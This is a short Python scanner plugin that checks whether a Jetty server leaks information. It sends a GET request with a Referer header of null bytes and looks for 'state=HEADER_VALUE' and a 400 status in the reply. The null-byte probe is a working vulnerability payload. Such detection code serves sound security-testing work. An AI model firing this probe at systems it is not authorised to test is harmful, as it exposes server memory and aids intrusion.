# coding=utf-8
import socket
from config import is_port_open, is_http


# @is_port_open
def verify(ip, port=80, name=None, timeout=10, types='ip'):
    info = {
        "url": "http://{}:{}".format(ip, port),
        "vuln_name": "jetty referer info leak",
        "severity": "medium",
    }
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, int(port)))
        flag = "GET / HTTP/1.1\r\nReferer:%s\r\n\r\n" % (chr(0) * 15)
        s.send(flag)
        data = s.recv(512)
        s.close()
        if 'state=HEADER_VALUE' in data and '400' in data:
            return info
    except:
        pass
